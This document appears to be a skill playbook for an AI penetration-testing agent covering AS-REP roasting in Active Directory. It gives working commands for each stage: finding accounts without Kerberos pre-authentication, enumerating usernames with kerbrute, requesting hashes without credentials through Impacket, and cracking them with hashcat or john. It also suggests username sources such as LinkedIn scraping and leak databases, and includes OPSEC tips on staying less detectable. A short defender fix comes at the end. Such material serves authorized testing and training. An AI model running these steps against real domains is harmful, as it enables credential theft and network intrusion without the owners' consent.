---
name: asrep-roasting
description: Request AS-REP for accounts with DONT_REQ_PREAUTH set and crack offline — like kerberoast but no auth required.
metadata:
  subdomain: active-directory
  when_to_use: "asrep as-rep roasting kerberos pre-auth dontreqpreauth"
  mitre_attack:
    - T1558.004
---

# AS-REP Roasting Playbook

## Prerequisite
**None** — no valid domain account needed. Network reachability to a DC on
TCP/UDP 88 is enough. This makes AS-REP roast more powerful than
kerberoast in some engagements (zero-auth pre-recon win).

## 1. Identify vulnerable users
In a hosted engagement, inspect the authorized collection through
`bloodhound_mcp_find_objects` and `bloodhound_mcp_object_profile`, or use a
bounded read-only `bloodhound_mcp_cypher_query` when the semantic tools do not
expose the required account flag. Confirm collection coverage first. In
standalone OSS, use the registered `bhce_cypher` tool against that instance.

Direct LDAP (if you have any cred or anonymous-bind allowed):
```bash
ldapsearch -x -H ldap://DC_IP -D 'USER@DOM' -w 'PASS' \
  -b 'DC=corp,DC=local' \
  '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName
```

Or brute-force user discovery (only when no LDAP access):
```bash
# Username list from OSINT, kerbrute validates which exist
kerbrute userenum --dc DC_IP -d DOM users.txt
```

## 2. Request AS-REP
**Impacket** (zero-auth path):
```bash
GetNPUsers.py DOM/ -dc-ip DC_IP -usersfile /tmp/users.txt \
  -format hashcat -no-pass -outputfile /tmp/asrep.hashes
```

**With creds** (more reliable, also enum):
```bash
GetNPUsers.py DOM/USER:'PASS' -dc-ip DC_IP -request \
  -format hashcat -outputfile /tmp/asrep.hashes
```

Output format: `$krb5asrep$23$USER@DOM:<ciphertext>` (RC4).

## 3. Crack offline (hashcat mode 18200)
```bash
hashcat -m 18200 -a 0 /tmp/asrep.hashes /usr/share/wordlists/rockyou.txt \
        --rules-file /usr/share/hashcat/rules/best64.rule

# John alternative
john --wordlist=rockyou.txt --format=krb5asrep /tmp/asrep.hashes
```

AS-REP-roastable users tend to be:
- Legacy service accounts (sysadmin set DONT_REQ_PREAUTH to "fix" a
  ticket issue in 2014, never reverted)
- Test / dev accounts with weak passwords
- Accounts created from a misconfigured PowerShell script

Crack rate is typically **higher** than kerberoast — these users are often
forgotten accounts with weak passwords.

## 4. Userlist sources when zero-auth
Without LDAP, your userlist comes from:
- `kerbrute userenum` against common lists (jsmith.txt, statistically-common-usernames)
- LinkedIn scrape → format conversion (`firstname.lastname`, `flastname`)
- Github commit emails from company orgs
- Email leaks (HIBP, Dehashed if op-authorized)
- Subdomain enumeration → username patterns in metadata

## 5. Promote
```
kg_add_node(kind="credential", label="USER:CRACKED_PW",
            props={"source":"asrep-roast","preauth":"disabled"})
```

## OPSEC
- AS-REQ without pre-auth is **event 4768** on the DC
- Defender's tell: 4768 with `Pre-Authentication Type=0` (no preauth)
- Username enum via kerbrute generates 4768 spam — throttle or accept
  detection if engagement allows
- A single AS-REP request per known user is quieter than enumeration

## CVSS
- Multiple roastable + crackable: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0
  (PR:N because no creds needed)
- One roastable, uncrackable: Informational + fix recommendation

## Defender fix
Remove `DONT_REQ_PREAUTH` flag:
```powershell
Set-ADAccountControl -Identity USER -DoesNotRequirePreAuth $false
```
Audit policy: `UserAccountControl & 0x400000` should be zero on all real users.
